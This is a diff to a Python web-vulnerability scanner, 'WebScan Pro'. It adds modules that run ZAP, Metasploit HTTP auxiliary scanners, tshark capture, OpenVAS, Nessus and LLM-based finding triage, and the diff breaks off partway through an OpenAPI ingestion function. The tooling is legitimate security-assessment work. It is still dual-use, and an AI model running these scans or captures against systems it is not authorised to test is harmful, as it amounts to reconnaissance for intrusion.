@@ -27,7 +27,7 @@ except ImportError:
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-VERSION    = "11.7"
+VERSION    = "12.0"
 TOOL_NAME  = "WebScan Pro"
 UA         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
 TIMEOUT    = 7
@@ -35,6 +35,7 @@ THREADS    = 50
 RATE       = 0.0
 LOG        = []
 FINDINGS   = defaultdict(list)
+OPENAPI_ENDPOINTS = []   # populated by openapi_ingest() — shared with scan modules
 _lock      = threading.Lock()
 _last_req  = [0.0]
 START_TIME = time.time()
@@ -345,6 +346,31 @@ CAT_META = {
 "shodan_intel":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-16","cvss":7.5,
         "wstg":"WSTG-CONF-01","asvs":"V14.4",
         "biz":"Shodan passive scan reveals exposed services, open ports and known CVEs on the target IP — attackers use this data to plan exploits."},
+"zap_scan":{"owasp":"A06:2021","owasp_name":"Vulnerable and Outdated Components","cwe":"CWE-200","cvss":7.5,
+        "wstg":"WSTG-INFO-01","asvs":"V14.4",
+        "biz":"OWASP ZAP automated scan detected vulnerabilities — findings are verified by an industry-standard open-source security scanner."},
+"msf_scan":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-16","cvss":7.0,
+        "wstg":"WSTG-CONF-01","asvs":"V14.4",
+        "biz":"Metasploit auxiliary scan detected exposed services and misconfigurations that could be leveraged by attackers."},
+"traffic_capture":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-319","cvss":6.5,
+        "wstg":"WSTG-CRYP-01","asvs":"V9.1",
+        "biz":"Network traffic analysis revealed unencrypted or sensitive data in transit — exposing credentials or session tokens to interception."},
+"openvas_scan":{"owasp":"A06:2021","owasp_name":"Vulnerable and Outdated Components","cwe":"CWE-200","cvss":8.0,
+        "wstg":"WSTG-INFO-01","asvs":"V14.4",
+        "biz":"OpenVAS network vulnerability scan identified known CVEs and service vulnerabilities on the target infrastructure."},
+"llm_triage":    {"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-693","cvss":0.0,
+    "wstg":"N/A","asvs":"N/A","biz_impact":"AI-assisted triage reduces false positives and prioritizes critical findings for faster remediation."},
+"openapi_scan":  {"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-200","cvss":6.0,
+    "wstg":"WSTG-INFO-02","asvs":"ASVS 3.5","biz_impact":"OpenAPI-discovered endpoints may expose undocumented or unauthenticated API routes."},
+"http_smuggling":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-444","cvss":8.1,
+    "wstg":"WSTG-INPV-15","asvs":"ASVS 5.3","biz_impact":"Request smuggling enables cache poisoning, authentication bypass, WAF bypass, and XSS/SSRF escalation across all users."},
+"backup_files":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-538","cvss":7.5,
+    "wstg":"WSTG-CONF-04","asvs":"ASVS 2.9","biz_impact":"Exposed backup/config files can leak credentials, source code, and DB dumps — leading to full system compromise."},
+"email_security":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-290","cvss":6.5,
+    "wstg":"WSTG-CONF-07","asvs":"ASVS 2.5","biz_impact":"Missing SPF/DKIM/DMARC allows phishing and Business Email Compromise (BEC) attacks impersonating the organization."},
+"nessus_scan":{"owasp":"A06:2021","owasp_name":"Vulnerable and Outdated Components","cwe":"CWE-200","cvss":8.5,
+        "wstg":"WSTG-INFO-01","asvs":"V14.4",
+        "biz":"Nessus comprehensive vulnerability scan identified critical security issues requiring immediate remediation."},
 }
 
 CAT_TITLES = {
@@ -432,6 +458,16 @@ CAT_TITLES = {
     # v11.8: Threat Intelligence API
     "threat_intel":    ("🛡️",  "Threat Intelligence (VirusTotal/AbuseIPDB/URLScan)"),
     "shodan_intel":    ("🌐",  "Shodan Intelligence (Ports/CVEs/Services)"),
+    "zap_scan":        ("🕷️",  "OWASP ZAP Automated Scan"),
+    "msf_scan":        ("🎯",  "Metasploit HTTP Auxiliary Scan"),
+    "traffic_capture": ("📡",  "Network Traffic Analysis (tshark)"),
+    "openvas_scan":    ("🔬",  "OpenVAS Vulnerability Scan"),
+    "nessus_scan":     ("🩺",  "Nessus Vulnerability Scan"),
+    "llm_triage":      ("🤖",  "AI LLM Triage & False-Positive Analysis"),
+    "openapi_scan":    ("📋",  "OpenAPI/Swagger Endpoint Discovery"),
+    "http_smuggling":  ("🚢",  "HTTP Request Smuggling"),
+    "backup_files":    ("🗄️",  "Backup & Sensitive File Discovery"),
+    "email_security":  ("📧",  "Email Security (SPF / DKIM / DMARC)"),
 }
 
 # ─── Terminal UI ───────────────────────────────────────────────────
@@ -621,7 +657,7 @@ def banner():
 """+Style.RESET_ALL)
     print(f"  {Fore.WHITE}{'─'*68}{Style.RESET_ALL}")
     print(f"  {Fore.CYAN}  Professional Web Security Scanner{Style.RESET_ALL}  {Fore.YELLOW}v{VERSION}{Style.RESET_ALL}")
-    print(f"  {Fore.WHITE}  80 Modules  |  CVSS v3.1 · OWASP · CWE  |  PDF · Burp XML · CVE Reports{Style.RESET_ALL}")
+    print(f"  {Fore.WHITE}  90 Modules  |  CVSS v3.1 · OWASP · CWE  |  LLM Triage · OpenAPI · PDF{Style.RESET_ALL}")
     print(f"  {Fore.WHITE}{'─'*68}{Style.RESET_ALL}\n")
 
 # ═══ MODULE 0 — WAF DETECTION (v9.0: 30+ signatures) ════════════
@@ -927,6 +963,1246 @@ def api_intelligence_scan(url, domain, ip,
         for _f in as_completed(_futs): _pass(_f)
 
     _module_done("api_intel")
+
+
+# ═══ MODULE 82 — OWASP ZAP INTEGRATION (v11.9) ══════════════════════
+
+def _find_zap():
+    """Find ZAP executable path."""
+    import shutil
+    for _cmd in ["zap.sh", "zaproxy", "zap-cli", "zap"]:
+        _p = shutil.which(_cmd)
+        if _p:
+            return _p
+    return None
+
+def zap_scan(url):
+    """MODULE 82 — OWASP ZAP automated vulnerability scan.
+    Install: sudo apt install zaproxy
+    """
+    if _module_skip("zap_scan"): info("Skipping ZAP scan (already done)"); return
+    _zap = _find_zap()
+    if not _zap:
+        info("ZAP Scan: zaproxy not found — install: sudo apt install zaproxy")
+        _module_done("zap_scan"); return
+    info(f"ZAP Scan: Using {_zap} on {url}")
+    _out = f"/tmp/_zap_out_{int(time.time())}.xml"
+    try:
+        _cmd = [_zap, "-cmd", "-quickurl", url, "-quickout", _out, "-quickprogress"]
+        _res = subprocess.run(_cmd, capture_output=True, text=True, timeout=180)
+        if os.path.exists(_out) and os.path.getsize(_out) > 0:
+            _parse_zap_xml(_out)
+        else:
+            _stdout = (_res.stdout or "") + (_res.stderr or "")
+            _zap_text_findings(_stdout)
+    except subprocess.TimeoutExpired:
+        warn("ZAP Scan: Timeout after 3 minutes")
+    except Exception as _e:
+        info(f"ZAP Scan error: {_e}")
+    finally:
+        if os.path.exists(_out):
+            try: os.remove(_out)
+            except: pass
+    _module_done("zap_scan")
+
+def _parse_zap_xml(_path):
+    """Parse ZAP XML report and add findings."""
+    try:
+        import xml.etree.ElementTree as ET
+        _tree = ET.parse(_path)
+        _root = _tree.getroot()
+        _count = 0
+        for _alert in _root.iter("alertitem"):
+            _name = _alert.findtext("alert") or _alert.findtext("name") or "ZAP Finding"
+            _risk = _alert.findtext("riskcode") or "1"
+            _desc = _alert.findtext("desc") or ""
+            _sol  = _alert.findtext("solution") or ""
+            _uri  = _alert.findtext("uri") or ""
+            _ri   = int(_risk) if _risk.isdigit() else 1
+            _sev  = "Critical" if _ri >= 3 else ("High" if _ri == 2 else ("Medium" if _ri == 1 else "Low"))
+            add("zap_scan", {
+                "type": f"ZAP: {_name}",
+                "severity": _sev,
+                "evidence": f"URI: {_uri}" if _uri else _desc[:120],
+                "detail": _sol[:200] if _sol else _desc[:200],
+                "confirmed": _ri >= 2,
+            })
+            _count += 1
+        (good if _count == 0 else warn)(f"ZAP Scan: {_count} findings")
+    except Exception as _e:
+        info(f"ZAP XML parse error: {_e}")
+
+def _zap_text_findings(_text):
+    """Parse ZAP text/CLI output for findings."""
+    _count = 0
+    for _line in _text.splitlines():
+        if "FAIL" in _line or ("WARN" in _line and "ZAP" in _line):
+            warn(f"ZAP: {_line.strip()[:150]}")
+            add("zap_scan", {"type": "ZAP Finding", "severity": "Medium",
+                "evidence": _line.strip()[:150], "confirmed": False})
+            _count += 1
+    if not _count:
+        info("ZAP Scan: No output or no issues detected")
+
+
+# ═══ MODULE 83 — METASPLOIT HTTP AUXILIARY (v11.9) ═══════════════════
+
+def msf_http_scan(url, domain, ip):
+    """MODULE 83 — Metasploit HTTP auxiliary modules (non-destructive scanning).
+    Install: sudo apt install metasploit-framework
+    """
+    if _module_skip("msf_scan"): info("Skipping Metasploit scan (already done)"); return
+    import shutil
+    if not shutil.which("msfconsole"):
+        info("Metasploit: msfconsole not found — install: sudo apt install metasploit-framework")
+        _module_done("msf_scan"); return
+    _port = "443" if url.startswith("https") else "80"
+    _ssl  = "true" if url.startswith("https") else "false"
+    _rhost = ip or domain
+    _modules = [
+        ("auxiliary/scanner/http/http_version", f"set RHOSTS {_rhost}; set RPORT {_port}; set SSL {_ssl}"),
+        ("auxiliary/scanner/http/options",      f"set RHOSTS {_rhost}; set RPORT {_port}; set SSL {_ssl}"),
+        ("auxiliary/scanner/http/robots_txt",   f"set RHOSTS {_rhost}; set RPORT {_port}; set SSL {_ssl}"),
+        ("auxiliary/scanner/http/http_header",  f"set RHOSTS {_rhost}; set RPORT {_port}; set SSL {_ssl}"),
+    ]
+    info(f"Metasploit: Running {len(_modules)} HTTP auxiliary modules on {_rhost}")
+    _results = []
+    for _mod, _opts in _modules:
+        try:
+            _rc = f"use {_mod}\n{_opts}\nrun\nexit\n"
+            _r = subprocess.run(["msfconsole", "-q", "-x", _rc],
+                                capture_output=True, text=True, timeout=90)
+            _results.append((_mod.split("/")[-1], _r.stdout or ""))
+        except subprocess.TimeoutExpired:
+            info(f"Metasploit: {_mod} timed out")
+        except Exception as _e:
+            info(f"Metasploit: {_e}")
+    _parse_msf_output(_results)
+    _module_done("msf_scan")
+
+def _parse_msf_output(_results):
+    """Parse Metasploit auxiliary output for findings."""
+    _count = 0
+    for _mod_name, _out in _results:
+        for _line in _out.splitlines():
+            _l = _line.strip()
+            if not _l: continue
+            if any(_kw in _l for _kw in ["TRACE", "PUT", "DELETE", "CONNECT"]) and "HTTP" in _l:
+                warn(f"MSF {_mod_name}: Dangerous HTTP method: {_l[:120]}")
+                add("msf_scan", {"type": f"Dangerous HTTP Method [{_mod_name}]",
+                    "severity": "Medium", "evidence": _l[:150], "confirmed": True})
+                _count += 1
+            elif "Server:" in _l and any(_s in _l.lower() for _s in ["apache", "nginx", "iis", "lighttpd"]):
+                add("msf_scan", {"type": f"Server Version Disclosure [{_mod_name}]",
+                    "severity": "Low", "evidence": _l[:150], "confirmed": True})
+                _count += 1
+            elif "[+]" in _l and len(_l) > 10:
+                add("msf_scan", {"type": f"MSF Finding [{_mod_name}]",
+                    "severity": "Low", "evidence": _l[:150], "confirmed": False})
+                _count += 1
+    (good if _count == 0 else warn)(f"Metasploit: {_count} issues found via auxiliary scan")
+
+
+# ═══ MODULE 84 — TSHARK TRAFFIC ANALYSIS (v11.9) ════════════════════
+
+def tshark_capture(url, domain, ip):
+    """MODULE 84 — tshark network traffic capture and analysis.
+    Install: sudo apt install tshark
+    Requires: root or tshark group membership
+    """
+    if _module_skip("traffic_capture"): info("Skipping tshark (already done)"); return
+    import shutil
+    if not shutil.which("tshark"):
+        info("tshark: Not found — install: sudo apt install tshark")
+        _module_done("traffic_capture"); return
+    _target_ip = ip or domain
+    _cap_file = f"/tmp/_cap_{int(time.time())}.pcap"
+    info(f"tshark: Capturing traffic to {_target_ip} for 15s...")
+    try:
+        subprocess.run(
+            ["tshark", "-i", "any", "-a", "duration:15",
+             "-f", f"host {_target_ip}", "-w", _cap_file, "-q"],
+            capture_output=True, timeout=20
+        )
+    except (subprocess.TimeoutExpired, Exception):
+        pass  # capture ended or iface issue
+    if not os.path.exists(_cap_file) or os.path.getsize(_cap_file) == 0:
+        info("tshark: No capture data (requires root/tshark group — run: sudo usermod -aG wireshark $USER)")
+        _module_done("traffic_capture"); return
+    _analyse_pcap(_cap_file, _target_ip)
+    try: os.remove(_cap_file)
+    except: pass
+    _module_done("traffic_capture")
+
+def _analyse_pcap(_cap_file, _target):
+    """Analyse pcap file for security issues."""
+    try:
+        # Check for cleartext HTTP
+        _r1 = subprocess.run(
+            ["tshark", "-r", _cap_file, "-Y", "http.request", "-T", "fields",
+             "-e", "http.request.method", "-e", "http.host", "-e", "http.request.uri"],
+            capture_output=True, text=True, timeout=30
+        )
+        _http = [l for l in _r1.stdout.splitlines() if l.strip()]
+        if _http:
+            warn(f"tshark: {len(_http)} cleartext HTTP requests detected to {_target}")
+            add("traffic_capture", {"type": "Cleartext HTTP Traffic",
+                "severity": "High",
+                "evidence": f"{len(_http)} unencrypted HTTP requests captured",
+                "confirmed": True})
+        # Check for POST/FTP/Telnet
+        _r2 = subprocess.run(
+            ["tshark", "-r", _cap_file, "-Y",
+             "http.request.method == \"POST\" or ftp or telnet",
+             "-T", "fields", "-e", "frame.number"],
+            capture_output=True, text=True, timeout=30
+        )
+        if _r2.stdout.strip():
+            warn("tshark: POST/FTP/Telnet traffic detected — credential exposure risk")
+            add("traffic_capture", {"type": "Credential Exposure Risk",
+                "severity": "Critical",
+                "evidence": "POST/FTP/Telnet frames in capture — credentials may be in plaintext",
+                "confirmed": True})
+        if not _http and not _r2.stdout.strip():
+            good("tshark: No cleartext or sensitive traffic detected")
+    except Exception as _e:
+        info(f"tshark analysis error: {_e}")
+
+
+# ═══ MODULE 85 — OPENVAS/GVM SCAN (v11.9) ════════════════════════════
+
+def openvas_scan(url, domain, ip):
+    """MODULE 85 — OpenVAS/GVM network vulnerability scan.
+    Install: sudo apt install gvm && sudo gvm-setup
+    Set env vars: OPENVAS_HOST (default 127.0.0.1), OPENVAS_USER, OPENVAS_PASS
+    """
+    if _module_skip("openvas_scan"): info("Skipping OpenVAS (already done)"); return
+    import shutil, re as _re
+    _cli = shutil.which("gvm-cli") or shutil.which("omp")
+    if not _cli:
+        info("OpenVAS: gvm-cli not found — install: sudo apt install gvm && sudo gvm-setup")
+        _module_done("openvas_scan"); return
+    _host = os.environ.get("OPENVAS_HOST", "127.0.0.1").strip()
+    _user = os.environ.get("OPENVAS_USER", "").strip()
+    _pass = os.environ.get("OPENVAS_PASS", "").strip()
+    if not _user or not _pass:
+        info("OpenVAS: Set OPENVAS_HOST, OPENVAS_USER, OPENVAS_PASS env vars to enable")
+        _module_done("openvas_scan"); return
+    _target_ip = ip or domain
+    info(f"OpenVAS: Connecting to GVM at {_host}...")
+    try:
+        _base = [_cli, "--gmp-username", _user, "--gmp-password", _pass, "--hostname", _host]
+        # Test connection
+        _v = subprocess.run(_base + ["--xml", "<get_version/>"], capture_output=True, text=True, timeout=15)
+        if "version" not in _v.stdout.lower():
+            info(f"OpenVAS: Cannot connect to GVM at {_host}"); _module_done("openvas_scan"); return
+        # Create target
+        _ct = subprocess.run(_base + ["--xml",
+            f'<create_target><name>ws_{int(time.time())}</name><hosts>{_target_ip}</hosts></create_target>'],
+            capture_output=True, text=True, timeout=20)
+        _tid = _re.search(r'id="([^"]+)"', _ct.stdout)
+        if not _tid: info("OpenVAS: Cannot create target"); _module_done("openvas_scan"); return
+        # Get scan config (Full and fast)
+        _cfg = subprocess.run(_base + ["--xml", "<get_configs/>"], capture_output=True, text=True, timeout=15)
+        _cid_m = _re.search(r'id="([0-9a-f-]{30,})"[^>]*>.*?Full and fast', _cfg.stdout, _re.DOTALL)
+        _cid = _cid_m.group(1) if _cid_m else "daba56c8-73ec-11df-a475-002264764cea"
+        # Create + start task
+        _task = subprocess.run(_base + ["--xml",
+            f'<create_task><name>WebScan_{domain[:20]}</name>'
+            f'<target id="{_tid.group(1)}"/><config id="{_cid}"/></create_task>'],
+            capture_output=True, text=True, timeout=20)
+        _tkid = _re.search(r'id="([^"]+)"', _task.stdout)
+        if not _tkid: info("OpenVAS: Cannot create task"); _module_done("openvas_scan"); return
+        subprocess.run(_base + ["--xml", f'<start_task task_id="{_tkid.group(1)}"/>'],
+                       capture_output=True, timeout=15)
+        info("OpenVAS: Scan started — polling (max 10 min)...")
+        _t0 = time.time()
+        while time.time() - _t0 < 600:
+            time.sleep(30)
+            _st = subprocess.run(_base + ["--xml", f'<get_tasks task_id="{_tkid.group(1)}"/>'],
+                                 capture_output=True, text=True, timeout=15)
+            if "Done" in _st.stdout or "Stopped" in _st.stdout:
+                _rr = subprocess.run(_base + ["--xml",
+                    f'<get_results filter="task_id={_tkid.group(1)}"/>'],
+                    capture_output=True, text=True, timeout=30)
+                _parse_openvas_xml(_rr.stdout); break
+            _pct = _re.search(r'<progress>(\d+)', _st.stdout)
+            if _pct: info(f"OpenVAS: Progress {_pct.group(1)}%...")
+        else:
+            info("OpenVAS: Scan still running — check GVM dashboard for results")
+    except Exception as _e:
+        info(f"OpenVAS: {_e}")
+    _module_done("openvas_scan")
+
+def _parse_openvas_xml(_xml):
+    """Parse OpenVAS XML results and add findings."""
+    try:
+        import xml.etree.ElementTree as ET
+        _root = ET.fromstring(_xml)
+        _count = 0
+        for _r in _root.iter("result"):
+            _name = _r.findtext("name") or "OpenVAS Finding"
+            _sv   = _r.findtext("severity") or "0"
+            _desc = (_r.findtext("description") or "")[:200]
+            _host = _r.findtext("host") or ""
+            try: _sv_f = float(_sv)
+            except: _sv_f = 0.0
+            _sev = "Critical" if _sv_f >= 9 else ("High" if _sv_f >= 7 else ("Medium" if _sv_f >= 4 else "Low"))
+            if _sv_f > 0:
+                add("openvas_scan", {"type": f"OpenVAS: {_name}", "severity": _sev,
+                    "evidence": f"Host: {_host} | CVSS: {_sv}", "detail": _desc,
+                    "confirmed": _sv_f >= 7})
+                _count += 1
+        (good if _count == 0 else warn)(f"OpenVAS: {_count} vulnerabilities found")
+    except Exception as _e:
+        info(f"OpenVAS parse error: {_e}")
+
+
+# ═══ MODULE 86 — NESSUS SCAN (v11.9) ════════════════════════════════
+
+def nessus_scan(url, domain, ip):
+    """MODULE 86 — Nessus vulnerability scan via REST API.
+    Set env vars:
+      NESSUS_URL     — e.g. https://localhost:8834
+      NESSUS_API_KEY — format: accessKey=XXX;secretKey=YYY
+    Install: download from tenable.com (license required)
+    """
+    if _module_skip("nessus_scan"): info("Skipping Nessus (already done)"); return
+    _nurl = os.environ.get("NESSUS_URL", "").strip()
+    _nkey = os.environ.get("NESSUS_API_KEY", "").strip()
+    if not _nurl or not _nkey:
+        info("Nessus: Set NESSUS_URL and NESSUS_API_KEY env vars to enable")
+        _module_done("nessus_scan"); return
+    _target_ip = ip or domain
+    _headers = {"X-ApiKeys": _nkey, "Content-Type": "application/json", "Accept": "application/json"}
+    info(f"Nessus: Connecting to {_nurl}...")
+    try:
+        import urllib3
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        _s = requests.Session()
+        _s.verify = False
+        _s.headers.update(_headers)
+        # Test connection
+        _ping = _s.get(f"{_nurl}/server/status", timeout=10)
+        if _ping.status_code != 200:
+            info(f"Nessus: Cannot connect — HTTP {_ping.status_code}"); _module_done("nessus_scan"); return
+        # Get policies
+        _pols = _s.get(f"{_nurl}/policies", timeout=10).json().get("policies", [])
+        _pol_id = (_pols[0]["id"] if _pols else None)
+        # Create scan (Basic Network Scan template UUID)
+        _scan_body = {"uuid": "ab4bacd2-05d6-44c3-9ae1-f7582aa8a943",
+                      "settings": {"name": f"WS_{domain[:20]}_{int(time.time())}",
+                                   "text_targets": _target_ip,
+                                   **({"policy_id": _pol_id} if _pol_id else {})}}
+        _cr = _s.post(f"{_nurl}/scans", json=_scan_body, timeout=15)
+        if _cr.status_code not in (200, 201):
+            info(f"Nessus: Scan creation failed — {_cr.status_code}"); _module_done("nessus_scan"); return
+        _sid = _cr.json().get("scan", {}).get("id")
+        if not _sid:
+            info("Nessus: No scan ID returned"); _module_done("nessus_scan"); return
+        _s.post(f"{_nurl}/scans/{_sid}/launch", timeout=10)
+        info(f"Nessus: Scan {_sid} launched — polling (max 15 min)...")
+        _t0 = time.time()
+        while time.time() - _t0 < 900:
+            time.sleep(30)
+            _st = _s.get(f"{_nurl}/scans/{_sid}", timeout=10).json()
+            _status = _st.get("info", {}).get("status", "")
+            info(f"Nessus: Status = {_status}")
+            if _status in ("completed", "canceled", "aborted"):
+                _parse_nessus_results(_st, domain); break
+        else:
+            info("Nessus: Scan still running — check Nessus dashboard for results")
+    except Exception as _e:
+        info(f"Nessus: {_e}")
+    _module_done("nessus_scan")
+
+def _parse_nessus_results(_data, _domain):
+    """Parse Nessus scan results and add findings."""
+    try:
+        _vulns = _data.get("vulnerabilities", [])
+        _count = 0
+        for _v in _vulns:
+            _name    = _v.get("plugin_name", "Nessus Finding")
+            _sev_int = _v.get("severity", 0)
+            _cnt     = _v.get("count", 1)
+            _sev = {4: "Critical", 3: "High", 2: "Medium", 1: "Low"}.get(_sev_int, "Info")
+            if _sev_int >= 1:
+                add("nessus_scan", {"type": f"Nessus: {_name}", "severity": _sev,
+                    "evidence": f"Count: {_cnt} | Severity: {_sev}",
+                    "confirmed": _sev_int >= 3})
+                _count += 1
+        (good if _count == 0 else warn)(f"Nessus: {_count} vulnerabilities found on {_domain}")
+    except Exception as _e:
+        info(f"Nessus parse error: {_e}")
+
+
+# ═══ MODULE 90 — LLM AI TRIAGE (v12.0) ══════════════════════════════
+def llm_triage_scan():
+    """MODULE 90 — AI-assisted false-positive triage via multi-provider LLM.
+    Reads all FINDINGS, sends batches to LLM, annotates with ai_verdict/ai_confidence/ai_reasoning.
+    Providers auto-detected from env vars. Gracefully skips if no key set."""
+    section("MODULE 90 — LLM AI TRIAGE","🤖")
+
+    # --- Provider detection (priority order) ---
+    _openai_key    = os.environ.get("OPENAI_API_KEY","").strip()
+    _anthropic_key = os.environ.get("ANTHROPIC_API_KEY","").strip()
+    _google_key    = os.environ.get("GOOGLE_API_KEY","").strip()
+    _groq_key      = os.environ.get("GROQ_API_KEY","").strip()
+    _ollama_host   = os.environ.get("OLLAMA_HOST","").strip()       # e.g. http://localhost:11434
+    _ollama_model  = os.environ.get("OLLAMA_MODEL","llama3").strip()
+
+    _provider = None
+    if _anthropic_key:  _provider = "anthropic"
+    elif _openai_key:   _provider = "openai"
+    elif _google_key:   _provider = "google"
+    elif _groq_key:     _provider = "groq"
+    elif _ollama_host:  _provider = "ollama"
+
+    if not _provider:
+        info("LLM Triage: No API key set — skipping (set ANTHROPIC_API_KEY, OPENAI_API_KEY, GOOGLE_API_KEY, GROQ_API_KEY, or OLLAMA_HOST)")
+        return
+
+    # --- Collect findings ---
+    _all_findings = []
+    for _cat, _items in FINDINGS.items():
+        for _item in _items:
+            _all_findings.append({"category": _cat, **_item})
+
+    if not _all_findings:
+        info("LLM Triage: No findings to triage")
+        return
+
+    good(f"LLM Triage: {len(_all_findings)} finding(s) → provider: {_provider}")
+
+    # --- Build prompt for a single finding ---
+    def _build_prompt(finding):
+        return (
+            "You are a senior penetration tester performing security finding triage.\n"
+            "Analyze this vulnerability finding and determine if it is a true positive or false positive.\n\n"
+            f"Finding:\n"
+            f"  Category: {finding.get('category','unknown')}\n"
+            f"  Title: {finding.get('title', finding.get('type',''))}\n"
+            f"  Severity: {finding.get('severity','?')}\n"
+            f"  Description: {str(finding.get('description',''))[:300]}\n"
+            f"  Evidence: {str(finding.get('evidence',''))[:300]}\n"
+            f"  Payload: {str(finding.get('payload',''))[:100]}\n"
+            f"  Confirmed: {finding.get('confirmed', False)}\n\n"
+            "Respond ONLY with a JSON object (no markdown, no explanation outside JSON):\n"
+            '{"verdict":"True Positive|False Positive|Needs Manual Verification",'
+            '"confidence":"High|Medium|Low",'
+            '"reasoning":"<1-2 sentences explaining why>",'
+            '"exploitability":"High|Medium|Low|None",'
+            '"priority":1-10}'
+        )
+
+    # --- Call each provider ---
+    def _call_anthropic(prompt):
+        import urllib.request as _ur, urllib.error as _ue
+        _body = json.dumps({
+            "model": "claude-3-haiku-20240307",
+            "max_tokens": 300,
+            "messages": [{"role": "user", "content": prompt}]
+        }).encode()
+        _req = urllib.request.Request(
+            "https://api.anthropic.com/v1/messages",
+            data=_body,
+            headers={"x-api-key": _anthropic_key, "anthropic-version": "2023-06-01",
+                     "content-type": "application/json"})
+        with _ur.urlopen(_req, timeout=20) as _r:
+            _d = json.loads(_r.read())
+            return _d["content"][0]["text"]
+
+    def _call_openai(prompt):
+        import urllib.request as _ur
+        _body = json.dumps({
+            "model": "gpt-4o-mini",
+            "max_tokens": 300,
+            "messages": [{"role": "user", "content": prompt}]
+        }).encode()
+        _req = urllib.request.Request(
+            "https://api.openai.com/v1/chat/completions",
+            data=_body,
+            headers={"Authorization": f"Bearer {_openai_key}",
+                     "Content-Type": "application/json"})
+        with _ur.urlopen(_req, timeout=20) as _r:
+            _d = json.loads(_r.read())
+            return _d["choices"][0]["message"]["content"]
+
+    def _call_google(prompt):
+        import urllib.request as _ur
+        _url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={_google_key}"
+        _body = json.dumps({"contents": [{"parts": [{"text": prompt}]}]}).encode()
+        _req = urllib.request.Request(_url, data=_body,
+                                      headers={"Content-Type": "application/json"})
+        with _ur.urlopen(_req, timeout=20) as _r:
+            _d = json.loads(_r.read())
+            return _d["candidates"][0]["content"]["parts"][0]["text"]
+
+    def _call_groq(prompt):
+        import urllib.request as _ur
+        _body = json.dumps({
+            "model": "llama3-8b-8192",
+            "max_tokens": 300,
+            "messages": [{"role": "user", "content": prompt}]
+        }).encode()
+        _req = urllib.request.Request(
+            "https://api.groq.com/openai/v1/chat/completions",
+            data=_body,
+            headers={"Authorization": f"Bearer {_groq_key}",
+                     "Content-Type": "application/json"})
+        with _ur.urlopen(_req, timeout=20) as _r:
+            _d = json.loads(_r.read())
+            return _d["choices"][0]["message"]["content"]
+
+    def _call_ollama(prompt):
+        import urllib.request as _ur
+        _base = _ollama_host.rstrip("/")
+        _body = json.dumps({
+            "model": _ollama_model, "prompt": prompt, "stream": False
+        }).encode()
+        _req = urllib.request.Request(f"{_base}/api/generate", data=_body,
+                                      headers={"Content-Type": "application/json"})
+        with _ur.urlopen(_req, timeout=60) as _r:
+            _d = json.loads(_r.read())
+            return _d.get("response","")
+
+    _CALLERS = {
+        "anthropic": _call_anthropic,
+        "openai":    _call_openai,
+        "google":    _call_google,
+        "groq":      _call_groq,
+        "ollama":    _call_ollama,
+    }
+    _caller = _CALLERS[_provider]
+
+    # --- Triage each finding ---
+    _triaged = 0
+    _fp_count = 0
+    _tp_count = 0
+    for _finding in _all_findings[:30]:   # cap at 30 to avoid excessive API cost
+        try:
+            _prompt   = _build_prompt(_finding)
+            _response = _caller(_prompt)
+            # Extract JSON from response (handle markdown code fences)
+            _json_str = _response.strip()
+            if "```" in _json_str:
+                _json_str = _json_str.split("```")[1]
+                if _json_str.startswith("json"): _json_str = _json_str[4:]
+            _result = json.loads(_json_str.strip())
+
+            # Annotate the finding in-place
+            _cat = _finding.get("category","")
+            _title = _finding.get("title", _finding.get("type",""))
+            for _stored in FINDINGS.get(_cat, []):
+                if _stored.get("title","") == _title or _stored.get("type","") == _title:
+                    _stored["ai_verdict"]       = _result.get("verdict","?")
+                    _stored["ai_confidence"]    = _result.get("confidence","?")
+                    _stored["ai_reasoning"]     = _result.get("reasoning","")
+                    _stored["ai_exploitability"]= _result.get("exploitability","?")
+                    _stored["ai_priority"]      = _result.get("priority", 5)
+                    _stored["ai_provider"]      = _provider
+                    break
+
+            _verdict = _result.get("verdict","?")
+            _conf    = _result.get("confidence","?")
+            if "False" in _verdict:
+                _fp_count += 1
+                info(f"  [AI FP] {_finding.get('category','')} — {_title[:60]} (confidence: {_conf})")
+            else:
+                _tp_count += 1
+                _pri = _result.get("priority", 5)
+                _msg = f"  [AI TP] {_finding.get('category','')} — {_title[:60]} (priority: {_pri}/10)"
+                (vuln if _pri >= 8 else warn if _pri >= 5 else info)(_msg)
+
+            _triaged += 1
+        except Exception as _e:
+            info(f"LLM Triage error for '{_finding.get('category','')}': {_e}")
+
+    good(f"LLM Triage complete: {_triaged} triaged | {_tp_count} True Positive | {_fp_count} False Positive | provider: {_provider}")
+    add("llm_triage", {
+        "provider": _provider,
+        "triaged": _triaged,
+        "true_positives": _tp_count,
+        "false_positives": _fp_count,
+        "severity": "Info",
+        "title": f"AI LLM Triage Complete ({_provider})",
+        "description": f"AI triage processed {_triaged} findings: {_tp_count} true positives, {_fp_count} likely false positives. Provider: {_provider}.",
+        "recommendation": "Review AI-flagged false positives manually before including in final report.",
+        "evidence": f"Triaged {_triaged}/{len(_all_findings)} findings via {_provider}"})
+
+
+# ═══ MODULE 91 — OPENAPI/SWAGGER INGESTION (v12.0) ═══════════════════
+def openapi_ingest(spec_source, base_url):
+    """MODULE 91 — Parse OpenAPI 3.x / Swagger 2.0 spec (URL or file path).
+    Extracts all endpoints, parameters, and auth schemes.
+    Populates OPENAPI_ENDPOINTS global for use by other scan modules."""
+    global OPENAPI_ENDPOINTS
+    section("MODULE 91 — OPENAPI/SWAGGER ENDPOINT DISCOVERY","📋")
+
+    # --- Load spec (URL or file) ---
+    _spec_text = None
+    if spec_source.startswith("http://") or spec_source.startswith("https://"):
+        try:
+            _sr = rget(spec_source, timeout=15)
+            _spec_text = _sr.text
+            good(f"OpenAPI spec loaded from URL: {spec_source} ({len(_spec_text)} bytes)")
+        except Exception as _e:
